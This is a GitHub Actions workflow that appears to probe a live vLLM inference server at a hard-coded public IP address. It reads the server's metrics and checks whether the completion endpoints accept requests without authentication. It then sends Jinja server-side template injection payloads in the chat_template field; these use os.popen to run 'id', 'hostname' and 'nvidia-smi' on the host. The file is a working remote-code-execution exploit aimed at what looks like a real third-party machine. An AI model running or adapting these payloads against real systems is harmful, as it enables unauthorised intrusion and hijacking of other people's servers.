name: ul5685vllm
on: workflow_dispatch
permissions:
  contents: write
jobs:
  v:
    runs-on: ubuntu-latest
    timeout-minutes: 25
    steps:
      - name: vllm
        run: |
          set +e
          B=http://123.184.7.135:8000
          echo "=== metrics head"
          curl -s -m 10 $B/metrics | grep -E 'vllm:num_requests|vllm:gpu_cache|info|model_name|engine' | head -20
          echo "=== metrics model label"
          curl -s -m 10 $B/metrics | grep -oE 'model_name="[^"]+"' | sort -u | head
          echo "=== invocations"
          curl -s -m 20 -X POST -H 'Content-Type: application/json' -d '{"inputs":"hello"}' $B/invocations -w '\n  code=%{http_code}\n' | head -c 500; echo
          echo "=== chat completions unauth"
          curl -s -m 20 -X POST -H 'Content-Type: application/json' -d '{"model":"x","messages":[{"role":"user","content":"hi"}],"max_tokens":8}' $B/v1/chat/completions -w '\n  code=%{http_code}\n' | head -c 400; echo
          echo "=== completions unauth"
          curl -s -m 20 -X POST -H 'Content-Type: application/json' -d '{"model":"x","prompt":"hi","max_tokens":4}' $B/v1/completions -w '\n  code=%{http_code}\n' | head -c 400; echo
          echo "=== render marker"
          curl -s -m 20 -X POST -H 'Content-Type: application/json' -d '{"model":"x","messages":[{"role":"user","content":"hi"}],"chat_template":"{{7*7}}"}' $B/v1/chat/completions/render -w '\n  code=%{http_code}\n' | head -c 600; echo
          echo "=== render ssti id"
          curl -s -m 20 -X POST -H 'Content-Type: application/json' -d '{"model":"x","messages":[{"role":"user","content":"hi"}],"chat_template":"{{cycler.__init__.__globals__.os.popen(\"id\").read()}}"}' $B/v1/chat/completions/render -w '\n  code=%{http_code}\n' | head -c 900; echo
          echo "=== render ssti lipsum"
          curl -s -m 20 -X POST -H 'Content-Type: application/json' -d '{"model":"x","messages":[{"role":"user","content":"hi"}],"chat_template":"{{lipsum.__globals__[\"os\"].popen(\"hostname;nvidia-smi -L\").read()}}"}' $B/v1/chat/completions/render -w '\n  code=%{http_code}\n' | head -c 900; echo
          echo "=== chat completions with chat_template field"
          curl -s -m 20 -X POST -H 'Content-Type: application/json' -d '{"model":"x","messages":[{"role":"user","content":"hi"}],"max_tokens":4,"chat_template":"{{7*7}}"}' $B/v1/chat/completions -w '\n  code=%{http_code}\n' | head -c 400; echo
          echo "=== tokenize override"
          curl -s -m 15 -X POST -H 'Content-Type: application/json' -d '{"model":"x","prompt":"hi"}' $B/tokenize -w '\n  code=%{http_code}\n' | head -c 300; echo
          echo DONE
